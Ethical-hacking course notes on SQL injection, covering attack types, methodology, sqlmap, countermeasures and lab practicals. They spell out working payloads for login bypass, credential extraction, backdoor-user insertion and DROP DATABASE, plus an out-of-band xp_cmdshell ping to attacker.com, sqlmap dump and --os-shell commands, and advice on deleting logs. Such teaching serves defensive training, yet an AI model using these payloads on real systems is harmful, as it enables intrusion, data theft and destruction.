# SQL Injection — Complete Theory & Practical Notes

## What SQL Injection Is, How It Works, Types, Methodology, Tools, Practicals, and Countermeasures

> **Course:** NewVersionHacker — Ethical Hacking Series
> **Disclaimer:** All content in these notes is strictly for **educational purposes only**. Never use SQL injection techniques against any system you do not own or have explicit written authorization to test. Unauthorized access to computer systems is a criminal offense in virtually every jurisdiction.

---

## Table of Contents

1. [What Is SQL Injection?](#1-what-is-sql-injection)
2. [Impact of a Successful SQL Injection Attack](#2-impact-of-a-successful-sql-injection-attack)
3. [Common Entry Points for SQL Injection](#3-common-entry-points-for-sql-injection)
4. [Types of SQL Injection](#4-types-of-sql-injection)
5. [SQL Injection Methodology — 7 Steps](#5-sql-injection-methodology--7-steps)
6. [Testing for SQL Injection Vulnerabilities](#6-testing-for-sql-injection-vulnerabilities)
7. [SQL Injection Tools](#7-sql-injection-tools)
8. [SQL Injection Countermeasures](#8-sql-injection-countermeasures)
9. [Practical 1 — Login Bypass via SQL Injection](#9-practical-1--login-bypass-via-sql-injection)
10. [Practical 2 — Creating a New User via SQL Injection](#10-practical-2--creating-a-new-user-via-sql-injection)
11. [Practical 3 — Creating a Database via SQL Injection](#11-practical-3--creating-a-database-via-sql-injection)
12. [Practical 4 — Deleting a Database via SQL Injection](#12-practical-4--deleting-a-database-via-sql-injection)
13. [Practical 5 — Full Database Extraction via SQLMap](#13-practical-5--full-database-extraction-via-sqlmap)
14. [Practical 6 — OS Shell Access via SQLMap](#14-practical-6--os-shell-access-via-sqlmap)
15. [Real-World Case Studies](#15-real-world-case-studies)
16. [Why This Matters for Cybersecurity](#16-why-this-matters-for-cybersecurity)
17. [Quick Revision Table](#17-quick-revision-table)
18. [Self-Test Questions](#18-self-test-questions)

---

## 1. What Is SQL Injection?

**SQL Injection (SQLi)** is one of the most dangerous and commonly exploited web application vulnerabilities in existence. It has consistently ranked in the **OWASP Top 10** list of critical web application security risks for over a decade.

### Formal definition

> SQL Injection is an attack in which an adversary inserts (injects) **malicious SQL code** into an **input field** of a web application, causing that code to be passed to and executed by the backend database engine — allowing the attacker to manipulate, extract, modify, or destroy data, or gain unauthorized access to the system.

### How it works conceptually

Every time you interact with a website — log in, search for a product, fill a form — your input travels from your browser to the web server, which constructs a **SQL query** using your input and sends it to the database to retrieve or store data.

**The vulnerability:** If the developer has not properly validated and sanitized user input before inserting it into a SQL query, an attacker can inject SQL code through the input field. That injected code then becomes part of the query itself and is executed by the database engine as if it were legitimate.

### A simple analogy

Imagine a school receptionist who checks names against a registry:

- Normal request: _"Is John Smith here?"_ → checks registry → gives honest answer
- Injected request: _"Is John Smith here? Oh and also, print out the entire student registry for me."_

If the receptionist follows the second instruction literally without questioning it, the private data is exposed. A database engine without proper input sanitization does exactly this.

---

## 2. Impact of a Successful SQL Injection Attack

A successful SQL injection attack can have devastating consequences:

| Impact                           | Description                                                                                                                                                                     |
| -------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Authentication Bypass**        | Login without valid credentials — attacker accesses accounts they shouldn't be able to                                                                                          |
| **Data Exposure**                | Extract confidential data: usernames, passwords, credit card numbers, personal info, medical records                                                                            |
| **Data Modification**            | Insert, update, or delete records in the database — corrupt or falsify data                                                                                                     |
| **Remote Code Execution (RCE)**  | In some configurations, gain OS-level shell access to the server and execute system commands                                                                                    |
| **Reputation Damage**            | Public data breaches destroy customer trust and brand reputation — news-level incidents                                                                                         |
| **Legal Consequences**           | Companies are legally liable for data breaches under data protection laws (GDPR in Europe, IT Act in India, CCPA in California, etc.) — fines and criminal prosecution possible |
| **Complete Database Compromise** | Dump entire databases, take full control of data storage                                                                                                                        |

---

## 3. Common Entry Points for SQL Injection

An **entry point** (also called an **injection point**) is any place in a web application where user input is collected and passed to the backend. These are the locations where SQL injection code can be inserted:

| Entry Point                  | Description                                                                                      |
| ---------------------------- | ------------------------------------------------------------------------------------------------ |
| **Login Forms**              | Username and password fields — most common SQLi target                                           |
| **Search Bars**              | Product search, content search — input passed to a SELECT query                                  |
| **Feedback / Contact Forms** | Text areas where input is stored in or queried from a database                                   |
| **URL Parameters**           | The `?id=1` or `?user=john` parts of a URL — changing the parameter value can manipulate queries |
| **Cookies**                  | Session cookies stored in the browser — modifiable and sometimes directly used in queries        |
| **HTTP Headers**             | User-Agent, Referer, X-Forwarded-For headers — sometimes logged or queried by backend systems    |
| **GET / POST Request Data**  | Any data transmitted via HTTP GET or POST methods to the server                                  |

> **URL Parameter example:**
> `http://example.com/product?id=1` shows product 1
> `http://example.com/product?id=2` shows product 2
> The `id` is a **parameter** — the value stored there determines which database record is retrieved. Injecting SQL code into `id` can manipulate the query.

---

## 4. Types of SQL Injection

There are 6 major types of SQL injection, each used in different attack scenarios depending on what information the attacker can observe and how the application responds.

---

### Type 1 — In-Band SQL Injection (Classic SQLi)

- **What it is:** The attacker receives the result of their injected query **directly and immediately** in the web application's response — in the same channel they sent the attack through.
- **Why "classic":** This is the most straightforward, traditional form of SQLi — inject code, see results instantly.
- **Example payload:** `' OR 1=1 --`
- **How it works:** The injected `1=1` is always true, so the database returns all rows. The `--` comments out the rest of the original query.
- **Subtypes:** Error-Based and Union-Based (see below) are both In-Band techniques.

---

### Type 2 — Blind SQL Injection

In Blind SQLi, the application **does not return query results or errors directly**. The attacker must infer information by observing the application's behavior indirectly. Two subtypes:

#### 2a — Boolean-Based Blind SQL Injection

- The attacker injects payloads that evaluate to **TRUE or FALSE**.
- The page's response changes depending on whether the condition is true or false (e.g., page loads normally vs. page shows an error or empty result).
- The attacker reconstructs data one bit at a time by asking yes/no questions.
- **Example payloads:**
  - `' AND 1=1 --` (True → page loads normally)
  - `' AND 1=2 --` (False → page behaves differently)

#### 2b — Time-Based Blind SQL Injection

- The attacker injects payloads that cause the database to **wait/sleep** for a specified number of seconds if the condition is true.
- If the response is delayed by the expected amount, the condition is confirmed true.
- No visible output changes — only response timing is observed.
- **Example payloads:**
  - SQL Server: `'; WAITFOR DELAY '0:0:5' --` (if true, response takes 5 seconds)
  - MySQL: `' AND SLEEP(5) --`

---

### Type 3 — Error-Based SQL Injection

- The attacker **intentionally enters invalid SQL** to cause the database to throw error messages.
- These error messages sometimes contain **sensitive information** — database version, table names, column names, file paths — which the attacker uses to understand the database structure.
- **Example:** Sending a query that produces an error like `"Microsoft SQL Server... Incorrect syntax near..."` reveals the DBMS type.
- **Attacker's use:** The error is a clue — it reveals the database engine, structure, and potential weaknesses to exploit next.

---

### Type 4 — Union-Based SQL Injection

- Uses the SQL **UNION** operator to **combine the results of the original query with a second, attacker-controlled SELECT query**.
- Allows the attacker to retrieve data from completely different tables than the one originally being queried.
- **Example payload:**
  ```sql
  ' UNION SELECT username, password FROM users --
  ```
- **Effect:** If successful, the attacker sees username and password columns from the `users` table appended to the normal page output.
- **Requirement:** The number of columns in the attacker's SELECT must match the number of columns in the original query.

---

### Type 5 — Out-of-Band SQL Injection

- Used when the attacker **cannot receive data through the same channel** as the attack (e.g., response-based methods are blocked or unavailable).
- Instead, the attacker forces the **database to send data to an external server** they control — via DNS or HTTP requests.
- The attacker's server logs the incoming request, confirming the attack succeeded.
- **Example (MSSQL xp_cmdshell):**
  ```sql
  '; exec master..xp_cmdshell 'ping attacker.com' --
  ```
  The database server pings the attacker's domain — the attacker's server sees the ping, confirming code execution.
- **Less common** — requires specific database configurations and permissions, but extremely hard to detect.

---

### Type 6 — Error-Based vs. Out-of-Band (Clarification)

| Type                | Visible output?        | Uses errors? | External channel? |
| ------------------- | ---------------------- | ------------ | ----------------- |
| In-Band             | Yes — immediate        | Sometimes    | No                |
| Boolean-Based Blind | No — behavior only     | No           | No                |
| Time-Based Blind    | No — timing only       | No           | No                |
| Error-Based         | Yes — error messages   | Yes          | No                |
| Union-Based         | Yes — combined results | No           | No                |
| Out-of-Band         | No                     | No           | Yes — DNS/HTTP    |

---

## 5. SQL Injection Methodology — 7 Steps

A structured methodology is how a professional security tester (or attacker) approaches SQL injection systematically. These 7 steps represent the full lifecycle of a SQLi attack:

---

### Step 1 — Identify Injection Points

Find all places where user input is accepted and passed to the database. Common locations:

- URL parameters (`?id=1`, `?category=shoes`)
- Login, search, contact, feedback forms
- Cookies and HTTP headers

**How to spot a URL parameter:**
If changing the value in the URL changes what is displayed on the page (e.g., `?id=1` shows User 1's profile, `?id=2` shows User 2's), that value is a parameter — and a potential injection point.

---

### Step 2 — Test for SQL Injection (Basic Payloads)

Inject basic test payloads into each identified input point and observe how the application responds:

```sql
'
''
`
``
,
"
""
/
//
\
\\
;
' OR '1'='1
' OR '1'='1'--
' OR 1=1--
" OR 1=1--
OR 1=1
```

If the application throws an error, loads unexpected data, or behaves differently from normal, it may be vulnerable to SQL injection.

---

### Step 3 — Database Fingerprinting

Determine which **database management system (DBMS)** the application is using. Different databases have different syntax, functions, and attack vectors.

**Common database engines:**

| DBMS                             | Used By                                                   |
| -------------------------------- | --------------------------------------------------------- |
| **MySQL**                        | Open source — widely used in web hosting, WordPress, etc. |
| **MSSQL** (Microsoft SQL Server) | Microsoft enterprise environments                         |
| **Oracle**                       | Large enterprises, financial institutions                 |
| **PostgreSQL**                   | Open source — popular in modern web applications          |
| **SQLite**                       | Embedded systems, mobile apps, lightweight applications   |

Each has slightly different SQL syntax — for example, the sleep function differs: `SLEEP(5)` in MySQL vs. `WAITFOR DELAY '0:0:5'` in MSSQL. Knowing the DBMS lets you use the correct payloads.

---

### Step 4 — Data Extraction

Once injection is confirmed, retrieve actual data:

1. **Identify table names** — which tables exist in the database?
2. **Identify column names** — what columns are in each table?
3. **Retrieve data** — extract the actual content.

**Example query to extract usernames and passwords:**

```sql
' UNION SELECT username, password FROM users --
```

---

### Step 5 — Authentication Bypass

Use SQLi to log in without valid credentials. The most basic authentication bypass payload:

**In the username field:**

```sql
' OR 1=1 --
```

**In the password field:** (leave empty or enter anything)

**What this does:** The `OR 1=1` makes the WHERE clause always evaluate to true, regardless of what username or password was actually entered. The `--` comments out the rest of the SQL query (including the password check), so the database returns the first user in the table and logs you in as them — often the admin.

---

### Step 6 — Further Exploitation

Once authenticated or with database access, additional exploitation is possible:

- **Access admin panel** — access privileged sections of the website
- **Read server files** — read sensitive files on the web server's filesystem (e.g., configuration files containing passwords)
- **Write files** — upload malicious files to the server (web shells)
- **Execute OS commands** — run operating system commands on the server
- **Upload malicious payload** — establish persistence

---

### Step 7 — Covering Tracks

A professional (or careful) attacker cleans up evidence to avoid detection:

- **Delete log files** — web server access logs, database logs, and error logs that recorded the attack activity
- **Clear command history** — remove traces of commands executed
- **Remove created accounts** — delete any backdoor user accounts created during the attack
- **Undo database changes** — remove inserted records, dropped tables (if the goal was stealth, not destruction)

This is why digital forensics is challenging — skilled attackers deliberately destroy evidence.

---

## 6. Testing for SQL Injection Vulnerabilities

### Manual Testing

The tester manually enters payloads and observes responses. Things to look for:

| Observation                | What It Indicates                                                         |
| -------------------------- | ------------------------------------------------------------------------- |
| **Error messages**         | Database error reveals backend information and confirms vulnerability     |
| **Changed page structure** | Content appearing that shouldn't, or missing content that should be there |
| **Authentication bypass**  | Logged in without valid credentials                                       |
| **Data revealed**          | Usernames, passwords, or other database content visible in the page       |
| **Execution delay**        | Page takes unusually long to respond (time-based blind SQLi)              |

### Automated Testing

Tools scan the application automatically, testing input fields systematically with hundreds of payloads:

| Tool                    | Type                                | Notes                                                                                           |
| ----------------------- | ----------------------------------- | ----------------------------------------------------------------------------------------------- |
| **SQLMap**              | Free, open-source                   | Most powerful and widely used automated SQLi tool; command-line based; used in the practicals   |
| **Burp Suite**          | Commercial (Pro) / Free (Community) | Intercepting proxy; manually set and modify payloads; also has automated scanner in Pro version |
| **Havij**               | Free                                | UI-based graphical tool; beginner-friendly; older but still used                                |
| **Acunetix**            | Commercial                          | Automated vulnerability scanner; provide URL and it scans automatically                         |
| **OWASP ZAP (Zaproxy)** | Free, open-source                   | OWASP's own tool; powerful and comprehensive; community supported                               |

---

## 7. SQL Injection Tools

### SQLMap — Deep Dive

SQLMap is the primary tool used in this practical session. Key facts:

- **Type:** Open-source, command-line tool
- **Language:** Python
- **Purpose:** Automatically detect and exploit SQL injection flaws, enumerate databases, extract data, and in some cases, gain OS-level access
- **Pre-installed in:** Kali Linux, Parrot OS
- **Documentation:** [https://sqlmap.org](https://sqlmap.org)

**Core SQLMap command structure:**

```bash
sqlmap -u "TARGET_URL" [options]
```

**Common flags used in practicals:**

| Flag         | Meaning                                                     |
| ------------ | ----------------------------------------------------------- |
| `-u`         | Target URL                                                  |
| `--cookie`   | Provide cookie values (for authenticated sessions)          |
| `--dbs`      | Enumerate all databases                                     |
| `-D`         | Specify a specific database to work with                    |
| `--tables`   | List all tables in the specified database                   |
| `-T`         | Specify a specific table to work with                       |
| `--dump`     | Dump (extract) the contents of the specified table          |
| `--os-shell` | Attempt to get an interactive OS shell on the target server |

---

## 8. SQL Injection Countermeasures

How to defend against SQL injection:

| Countermeasure                                  | Explanation                                                                                                                                                                                  |
| ----------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Parameterized Queries (Prepared Statements)** | The most effective defense. SQL code and user data are sent to the database separately — the database never interprets user input as SQL code. Supported by all major programming languages. |
| **Input Validation / Sanitization**             | Validate that all input matches expected patterns (e.g., an email field should only accept valid email format). Reject or sanitize anything that doesn't match.                              |
| **Stored Procedures**                           | Pre-written SQL procedures stored in the database — user input is passed as parameters, not concatenated into SQL strings.                                                                   |
| **Web Application Firewall (WAF)**              | Sits in front of the web server; inspects incoming traffic and blocks requests containing known SQL injection patterns                                                                       |
| **Least Privilege Database Accounts**           | The database user account used by the web application should have only the minimum permissions needed — only SELECT where only reading is needed; no DROP, no CREATE, no EXEC                |
| **Error Handling**                              | Never display raw database error messages to users — they reveal database structure and version. Use generic error pages. Log errors server-side only.                                       |
| **Regular Security Testing**                    | Conduct regular penetration testing and vulnerability assessments of web applications before attackers find the flaws first                                                                  |
| **ORM (Object-Relational Mapping)**             | Modern frameworks (Django, Laravel, Hibernate) use ORMs that handle SQL query construction safely, reducing direct SQL string construction                                                   |
| **Update and Patch DBMS**                       | Keep the database engine updated to the latest version — known vulnerabilities in older versions can be exploited                                                                            |

---

## 9. Practical 1 — Login Bypass via SQL Injection

### Objective

Demonstrate that a vulnerable login form can be bypassed without knowing any valid credentials.

### Environment

- **Target:** `www.goshoping.com` (lab website hosted on Windows Server 2022)
- **Attack machine:** Windows 11 (to access the website as a client)
- **Entry point:** Login page (username + password fields)

### Payload Used

**Username field:**

```sql
' OR 1=1 --
```

**Password field:** (left empty)

### What This Payload Does

The original SQL query the server constructs from a normal login might look like:

```sql
SELECT * FROM users WHERE username = 'INPUT' AND password = 'INPUT'
```

After injecting the payload, it becomes:

```sql
SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = ''
```

- `OR 1=1` is always true → the WHERE clause evaluates to true for every row
- `--` comments out everything after it (including the password check)
- The database returns the first user in the table (often the admin)
- **Result: Logged in without any valid credentials**

### Outcome

Successfully logged in and accessed the website dashboard — confirming the login form is vulnerable to SQL injection. This type of access is called a **fake login** or **authentication bypass**.

---

## 10. Practical 2 — Creating a New User via SQL Injection

### Objective

Demonstrate that an attacker can create new database entries (user accounts) through a vulnerable input field.

### Background

The MSSQL database engine (Microsoft SQL Server) stores login credentials in a table called `dbo.Login` inside the website's database. Only someone with database admin access should be able to add records to this table. SQL injection bypasses this access control.

### Payload Used (in the username field of the login form)

```sql
'; INSERT INTO login VALUES('john', 'apple123'); --
```

**Breakdown:**

| Part                                          | Meaning                                                                               |
| --------------------------------------------- | ------------------------------------------------------------------------------------- |
| `'`                                           | Closes the opening string quote in the original query                                 |
| `;`                                           | Ends the original SQL statement                                                       |
| `INSERT INTO login VALUES('john','apple123')` | New SQL command: insert username `john` with password `apple123` into the login table |
| `;`                                           | Ends the injected statement                                                           |
| `--`                                          | Comments out the rest of the original query, preventing syntax errors                 |

### Steps

1. Navigate to the login form.
2. Paste the full injection payload into the username field.
3. Leave the password field empty.
4. Click Login — **no error is displayed**, confirming the query executed successfully.
5. Attempt to log in with username `john`, password `apple123` → **login succeeds**.
6. Verify in MSSQL Server Management Studio → the `john` entry is visible in the `dbo.Login` table.

### Cleanup (Delete the Injected User)

```sql
DELETE FROM [goshoping].[dbo].[login] WHERE username = 'john';
```

Executed in a New Query window in SSMS → confirms: "1 row(s) affected" → the entry is removed.

---

## 11. Practical 3 — Creating a Database via SQL Injection

### Objective

Demonstrate that an attacker can create entirely new databases on the server through SQL injection.

### Payload Used

```sql
'; CREATE DATABASE mydatabase; --
```

or

```sql
'; CREATE DATABASE nvhdatabase; --
```

### Steps

1. Inject the payload via the login form username field.
2. No error returned → query executed successfully.
3. Reconnect to MSSQL Server Management Studio and expand the Databases folder.
4. **`mydatabase`** (and then `nvhdatabase`) appear as new databases — created entirely through the SQL injection.

### What This Proves

Any attacker who can inject into this form can create persistent storage structures on the server — this could be used to store exfiltrated data, create backdoor structures, or serve as a staging area for further attacks.

---

## 12. Practical 4 — Deleting a Database via SQL Injection

### Objective

Demonstrate that SQL injection can be used destructively — to permanently delete databases.

### Payload Used

```sql
'; DROP DATABASE mydatabase; --
```

### Steps

1. Inject the DROP DATABASE payload via the login form.
2. Reconnect SSMS and refresh the database list.
3. **`mydatabase` is gone** — permanently deleted.
4. Repeat with `nvhdatabase`:

```sql
'; DROP DATABASE nvhdatabase; --
```

### Security Implication

A single SQL injection flaw in a login form — with no other access — can destroy entire databases. This is the mechanism behind many ransomware-adjacent attacks where attackers delete production data and demand payment for restoration (or simply delete as sabotage).

---

## 13. Practical 5 — Full Database Extraction via SQLMap

### Objective

Use SQLMap to automatically enumerate and extract the complete database contents of a logged-in web application session.

### Environment

- **Target:** `www.gomoveu.com` (separate lab website)
- **Attacker machine:** Kali Linux
- **Tool:** SQLMap

### Step 1 — Retrieve Session Cookie

Log in to the target website as a normal user. Then open browser Developer Tools (F12) → Console tab → run:

```javascript
document.cookie
```

This outputs a session cookie string (a unique session identifier). **Copy this value.**

### Step 2 — Enumerate All Databases

Open a terminal in Kali Linux:

```bash
sqlmap -u "http://www.gomoveu.com/login.aspx?id=1" --cookie="SESSIONID=<copied_cookie_value>" --dbs
```

**Flag breakdown:**

| Flag       | Purpose                                                                                   |
| ---------- | ----------------------------------------------------------------------------------------- |
| `-u`       | Target URL (the page you were on when logged in)                                          |
| `--cookie` | Your authenticated session cookie — SQLMap uses this to make requests as a logged-in user |
| `--dbs`    | Enumerate all databases on the server                                                     |

**Output:** SQLMap lists all databases found on the server, including `goshoping` and `gomoveu` (the lab websites) alongside system databases.

### Step 3 — List Tables in a Specific Database

```bash
sqlmap -u "http://www.gomoveu.com/login.aspx?id=1" --cookie="SESSIONID=<value>" -D gomoveu --tables
```

**Output:** All table names inside the `gomoveu` database:

- `comments`
- `customer_logins`
- `movie_details`
- `offices`
- `order_details`

### Step 4 — Dump Contents of a Specific Table

```bash
sqlmap -u "http://www.gomoveu.com/login.aspx?id=1" --cookie="SESSIONID=<value>" -D gomoveu -T customer_logins --dump
```

**Output:** All rows from the `customer_logins` table, including:

- User ID numbers
- Usernames
- **Plaintext or hashed passwords**
- Any other columns in the table

### Step 5 — Verify Extracted Credentials

Take a set of credentials from the dump (e.g., username: `kety`, password: `apple`). Log into the website using those credentials — **login succeeds**, confirming the extracted data is accurate.

### What This Demonstrates

In a real attack scenario, this is how millions of user credentials are leaked in data breaches. An attacker finds one SQLi vulnerability, runs SQLMap, and dumps the entire user database containing every registered user's credentials.

---

## 14. Practical 6 — OS Shell Access via SQLMap

### Objective

Demonstrate the most severe impact of SQL injection: gaining an interactive operating system shell on the target server — allowing execution of any OS command.

### Prerequisite

This requires the database to be configured with elevated privileges (e.g., MSSQL with `xp_cmdshell` enabled, or MySQL running as root). Not all databases allow this, but misconfigured or privileged databases do.

### Command

```bash
sqlmap -u "http://www.gomoveu.com/login.aspx?id=1" --cookie="SESSIONID=<value>" --os-shell
```

**What happens:** SQLMap detects that `xp_cmdshell` (an extended stored procedure in MSSQL that allows OS command execution) is available, gains access to it, and presents an interactive prompt.

### Commands Demonstrated in the OS Shell

Once inside the OS shell:

```bash
# Check hostname of the target server
hostname
# Output: WIN-SERVER2022  (confirms we are on the target machine)

# List all running processes (equivalent of Task Manager)
tasklist
# Output: Full list of running processes with PID, session, and memory usage

# Attempt to shut down the server
shutdown /s /t 0
# Output: Access denied / environment failure (blocked by OS security in this case)
```

### Verification — Cross-Referencing Task Manager

A process ID visible in the SQLMap shell output (e.g., PID `1088`) can be matched to the actual Task Manager on the server machine — confirming that the shell output is genuinely from the remote server and not fabricated.

### What OS Shell Access Enables

| Action                                  | Possible via OS Shell?             |
| --------------------------------------- | ---------------------------------- |
| Read any file on the server             | Yes                                |
| Create/upload files (malware, webshell) | Yes                                |
| Create new OS user accounts             | Yes                                |
| Exfiltrate data                         | Yes                                |
| Install persistence mechanisms          | Yes                                |
| Shut down / restart the server          | Sometimes (depends on permissions) |
| Pivot to other machines on the network  | Yes                                |

---

## 15. Real-World Case Studies

These are real-world SQL injection incidents that had massive real-world consequences. They are referenced in the lecture as examples studied _after_ the practical:

| Year     | Target                           | What Happened                                                                                                             |
| -------- | -------------------------------- | ------------------------------------------------------------------------------------------------------------------------- |
| **2008** | **Heartland Payment Systems**    | 130 million credit card numbers stolen via SQL injection — one of the largest data breaches in US history at the time     |
| **2011** | **HBGary Federal**               | Security firm hacked via SQLi; emails dumped publicly, CEO resigned                                                       |
| **2012** | **NASA**                         | Internal servers compromised via SQL injection; attacker posted proof publicly                                            |
| **2015** | **TalkTalk (UK)**                | 157,000 customer records stolen via SQLi; £400,000 fine; CEO appeared before parliament                                   |
| **2016** | **US Voter Registration System** | SQLi vulnerabilities found in voter registration systems in multiple states — exposed personal data of millions of voters |

These cases demonstrate that SQL injection is not a theoretical risk — it has caused real, massive, and lasting harm to organizations and individuals.

---

## 16. Why This Matters for Cybersecurity

| Topic                                   | Connection to SQL Injection                                                                                                                                                                |
| --------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **OWASP Top 10**                        | SQL injection (now under "Injection" category) has been in the OWASP Top 10 consistently since its inception — it is considered one of the most critical risks in web application security |
| **Web Application Penetration Testing** | SQLi testing is a mandatory step in any web app pentest; understanding it is required for CEH, OSCP, and similar certifications                                                            |
| **Bug Bounty Programs**                 | SQL injection vulnerabilities in major platforms regularly pay out significant bounties — HackerOne and Bugcrowd have paid six-figure bounties for critical SQLi findings                  |
| **Secure Coding Practice**              | Understanding how SQLi works is essential for developers to write safe code using parameterized queries and input validation                                                               |
| **Digital Forensics**                   | SQLi attacks leave traces in web server logs, database logs, and network captures — forensic investigators analyze these to reconstruct attacks                                            |
| **Data Breach Investigation**           | Many major data breaches trace back to unpatched SQLi vulnerabilities — forensic analysis of these events uses the same logs and artifacts discussed in the covering tracks section        |

---

## 17. Quick Revision Table

| Concept                      | One-line Summary                                                                          |
| ---------------------------- | ----------------------------------------------------------------------------------------- |
| **SQL Injection**            | Inserting malicious SQL code into input fields to manipulate the backend database         |
| **In-Band SQLi**             | Attacker sees results directly in the web page response — classic, most common            |
| **Boolean-Based Blind SQLi** | No direct output — infer data from true/false page behavior changes                       |
| **Time-Based Blind SQLi**    | No direct output — infer data from response delay using SLEEP/WAITFOR                     |
| **Error-Based SQLi**         | Force database errors to extract information from error messages                          |
| **Union-Based SQLi**         | Use UNION operator to append attacker's query results to legitimate output                |
| **Out-of-Band SQLi**         | Force database to send data to attacker's external server via DNS/HTTP                    |
| **Injection Points**         | Login forms, search bars, URL parameters, cookies, HTTP headers                           |
| **`' OR 1=1 --`**            | Classic authentication bypass payload                                                     |
| **INSERT INTO**              | SQL command used to create new database records via injection                             |
| **DROP DATABASE**            | SQL command used to permanently delete a database via injection                           |
| **SQLMap**                   | Open-source automated SQL injection tool — used for enumeration and data extraction       |
| **`--dbs`**                  | SQLMap flag to enumerate all databases                                                    |
| **`--tables`**               | SQLMap flag to list tables in a database                                                  |
| **`--dump`**                 | SQLMap flag to extract all data from a table                                              |
| **`--os-shell`**             | SQLMap flag to attempt OS-level command execution                                         |
| **Parameterized Queries**    | Primary countermeasure — separates SQL code from user input                               |
| **WAF**                      | Web Application Firewall — blocks SQLi patterns at the network level                      |
| **Covering Tracks**          | Attacker deletes logs and evidence after a successful attack                              |
| **xp_cmdshell**              | MSSQL extended procedure that allows OS command execution — exploited in OS shell attacks |

---

## 18. Self-Test Questions

1. Define SQL injection in your own words. Why is it dangerous?
2. List five real-world impact types of a successful SQL injection attack.
3. Name five common entry points (injection points) in a web application.
4. Explain the difference between In-Band and Blind SQL injection.
5. Why does the payload `' OR 1=1 --` bypass a login form? Break down each part of the payload and explain what it does.
6. What is the difference between Boolean-Based and Time-Based Blind SQL injection? When would you use each?
7. In Union-Based SQLi, what requirement must be met for the attack to work?
8. What is Out-of-Band SQL injection, and how does the attacker receive their data in this type?
9. Walk through all 7 steps of the SQL injection methodology.
10. What SQLMap command would you use to list all databases on a target server at `http://target.com/page?id=1` with a session cookie `SESSION=abc123`?
11. What does the `--os-shell` SQLMap flag do, and what server-side condition must be present for it to work?
12. Name and explain three SQL injection countermeasures.
13. What is database fingerprinting and why is it an important step in the methodology?
14. From the real-world case studies, give two examples of SQL injection attacks and their consequences.

---

## What's Next

This lecture covered SQL injection from theory through hands-on practical — authentication bypass, data insertion, database creation and deletion, full database extraction with SQLMap, and OS shell access. Likely next topics in the series:

- **XSS (Cross-Site Scripting)** — client-side injection attacks targeting users rather than the database
- **CSRF (Cross-Site Request Forgery)** — tricking authenticated users into performing unintended actions
- **File Inclusion Vulnerabilities (LFI/RFI)** — including unauthorized files through the URL
- **SSRF (Server-Side Request Forgery)** — making the server send requests on the attacker's behalf
- **Burp Suite deep dive** — intercepting, modifying, and replaying HTTP requests for advanced manual testing
- **ZAP/Acunetix automated scanning** — comprehensive vulnerability scanning workflows

_SQL injection remains one of the most important vulnerabilities to understand in web security. Despite being a decades-old technique, it continues to cause massive real-world breaches because developers still write code without proper input validation. Every cybersecurity professional — red team and blue team alike — must understand SQLi deeply._
